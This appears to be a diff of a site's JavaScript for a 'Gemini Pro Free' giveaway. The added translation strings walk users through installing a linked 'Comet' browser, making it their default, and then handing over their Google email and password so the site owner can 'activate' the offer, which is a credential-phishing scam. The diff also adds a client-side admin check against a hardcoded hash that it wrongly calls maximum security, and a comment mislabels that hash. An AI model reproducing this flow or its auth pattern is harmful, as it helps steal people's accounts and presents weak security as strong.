@@ -325,17 +325,29 @@ function toggleAdminLogin() {
     }
 }
 
-function adminLogin() {
+// SHA-256 hash function (secure)
+async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    return hashHex;
+}
+
+async function adminLogin() {
     const passwordInput = document.getElementById('adminPassword');
     const password = passwordInput.value;
     
-    // Hash the password for security (simple XOR with key)
-    const correctPasswordHash = btoa('200320'); // Base64 encoded
-    const inputHash = btoa(password);
+    // Hash the password with SHA-256 for maximum security
+    const inputHash = await sha256(password);
+    // Pre-computed hash of "200320"
+    const correctPasswordHash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92';
     
     if (inputHash === correctPasswordHash) {
-        // Store admin session
-        sessionStorage.setItem('adminAuth', correctPasswordHash);
+        // Store admin session with timestamp
+        const authToken = await sha256(password + Date.now().toString());
+        sessionStorage.setItem('adminAuth', authToken);
+        sessionStorage.setItem('adminTime', Date.now().toString());
         
         // Redirect to admin page
         window.location.href = 'admin.html';
@@ -374,6 +386,60 @@ function updateAllTranslations() {
     document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
         const key = element.getAttribute('data-translate-placeholder');
         element.placeholder = t(key);
+    });
+    
+    // Auto-translate hardcoded text
+    const textMappings = {
+        'Giới thiệu': t('progressStep1'),
+        'Hướng dẫn': t('progressStep2'),
+        'Thông tin': t('progressStep3'),
+        'Hoàn thành': t('progressStep4'),
+        '👋 Chào mừng bạn!': t('step1Title'),
+        'Bắt đầu ngay →': t('step1Button'),
+        '📋 Hướng dẫn chi tiết': t('step2Title'),
+        'Vui lòng thực hiện các bước sau:': t('step2Intro'),
+        'Truy cập link và tải phần mềm Comet': t('step2Instruction1Title'),
+        'Nhấn vào nút bên dưới để truy cập link tải xuống': t('step2Instruction1Text'),
+        '🔗 Truy cập link tải Comet': t('step2Instruction1Button'),
+        'Đăng nhập Comet': t('step2Instruction2Title'),
+        'Đăng nhập Comet bằng tài khoản Google giống đúng với tài khoản Google đã nhấp vào link trước đó': t('step2Instruction2Text'),
+        'Sử dụng Comet': t('step2Instruction3Title'),
+        'Mở trình duyệt Comet và hỏi 1 vài câu hỏi bất kì': t('step2Instruction3Text'),
+        'Đặt làm mặc định': t('step2Instruction4Title'),
+        'Đặt Comet làm trình duyệt mặc định': t('step2Instruction4Text'),
+        'Tôi đã hoàn thành tất cả các bước trên': t('step2Checkbox'),
+        '← Quay lại': t('step2ButtonBack'),
+        'Tiếp tục →': t('step2ButtonNext'),
+        '📝 Thông tin tài khoản': t('step3Title'),
+        'Vui lòng nhập thông tin tài khoản Google của bạn để nhận Gemini Pro:': t('step3Intro'),
+        'Bạn hãy giúp mình tạo 1 tài khoản Google mới nhé (có thể sử dụng điện thoại để tạo)': t('step3InfoNote'),
+        'Mình sẽ đăng nhập tài khoản và giúp bạn kích hoạt, bạn có thể đổi mật khẩu ngay sau đó.': t('step3SecurityNote'),
+        'Email Google *': t('step3EmailLabel'),
+        'example@gmail.com': t('step3EmailPlaceholder'),
+        'Email tài khoản Google bạn đã sử dụng': t('step3EmailHint'),
+        'Mật khẩu *': t('step3PasswordLabel'),
+        'Nhập mật khẩu': t('step3PasswordPlaceholder'),
+        'Mật khẩu tài khoản Google của bạn': t('step3PasswordHint'),
+        'Email liên hệ *': t('step3ContactLabel'),
+        'contact@example.com': t('step3ContactPlaceholder'),
+        'Email để chúng tôi liên hệ với bạn': t('step3ContactHint'),
+        'Xác nhận →': t('step3ButtonSubmit'),
+        '✅ Hoàn thành!': t('step4Title'),
+        'Cảm ơn bạn đã hoàn thành!': t('step4Thanks'),
+        'Chúng tôi đã nhận được thông tin của bạn. Tài khoản Gemini Pro 1 năm của bạn sẽ được kích hoạt trong vòng 10-20 phút.': t('step4Message'),
+        '🏠 Về trang chủ': t('step4Button'),
+        '© 2025 Gemini Pro Free. Made with ❤️': t('footerText'),
+        'Đang xử lý...': t('loadingText')
+    };
+    
+    // Replace hardcoded text
+    Object.keys(textMappings).forEach(hardcodedText => {
+        const elements = document.querySelectorAll('*');
+        elements.forEach(element => {
+            if (element.textContent === hardcodedText) {
+                element.textContent = textMappings[hardcodedText];
+            }
+        });
     });
 }
 
